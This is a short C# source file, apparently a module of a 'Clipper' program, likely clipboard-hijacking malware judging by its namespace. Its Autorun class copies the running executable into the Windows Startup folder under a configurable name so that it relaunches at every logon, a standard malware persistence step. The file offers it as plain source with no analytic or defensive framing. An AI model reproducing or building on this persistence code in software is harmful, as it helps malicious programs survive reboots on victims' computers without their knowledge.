using System;
using System.IO;

namespace Clipper.Modules
{
    internal sealed class Autorun
    {
        private static string startup_directory = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
        private static string executable = System.Reflection.Assembly.GetEntryAssembly().Location;

        public static bool is_installed()
        {
            return File.Exists($"{startup_directory}\\{config.autorun_name}.exe");
        }

        public static void install()
        {
            if (config.autorun_enabled)
                File.Copy(executable, $"{startup_directory}\\{config.autorun_name}.exe");
        }

    }
}
